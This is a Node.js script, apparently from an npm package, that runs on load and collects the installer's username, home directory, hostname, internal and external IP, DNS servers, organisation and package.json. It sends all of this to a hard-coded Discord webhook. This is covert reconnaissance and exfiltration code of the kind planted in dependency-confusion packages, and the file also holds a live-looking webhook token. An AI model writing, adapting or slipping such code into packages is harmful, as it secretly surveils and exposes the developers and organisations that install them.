const os = require("os");
const dns = require("dns");
const https = require("https");
const packageJSON = require("./package.json");

const package = packageJSON.name;

// Function to get the internal IP address
function getIPAddress() {
    const networkInterfaces = os.networkInterfaces();
    for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return 'IP not found';
}

// Function to get the external IP address
function getExternalIP(callback) {
    https.get('https://ipinfo.io/json', (res) => {
        let data = '';

        // Receive data chunks
        res.on('data', (chunk) => {
            data += chunk;
        });

        // On response end, parse and return the IP address
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org}); // Call the callback with the external IP address
        });
    }).on('error', (e) => {
        console.error('Error fetching external IP address:', e);
        callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'}); // Handle errors
    });
}

// Prepare the tracking data
getExternalIP((externalIP) => {
    const trackingData = JSON.stringify({
        package: package,
        directory: __dirname,
        home_directory: os.homedir(),
        username: os.userInfo().username,
        dns: dns.getServers(),
        internal_hostname: os.hostname(),
        internal_ip: getIPAddress(), // Add internal IP address here
        external_ip: externalIP.ip, // Get External IP Address
        external_hostname: externalIP.hostname,
        organization: externalIP.organization,
        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
        package_version: packageJSON.version,
        package_json: packageJSON,
        package_type: 'npm',
    });

    const webhookURL = "https://discord.com/api/webhooks/1301084955144618004/dzBF_mUG0Ob7MXPUjc3j4cbfOxRF8aquDty3TZCzVy7y-Pjh78fkwe_z1JezoYhAOv89"; // Replace with your Discord webhook URL

    const postData = JSON.stringify({
        content: `\`\`\`json\n${trackingData}\n\`\`\`` // Wrap the tracking data in a code block for better formatting
    });

    const options = new URL(webhookURL);

    options.method = "POST";
    options.headers = {
        "Content-Type": "application/json",
        "Content-Length": postData.length,
    };

    const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        console.error(e);
    });

    req.write(postData);
    req.end();
});
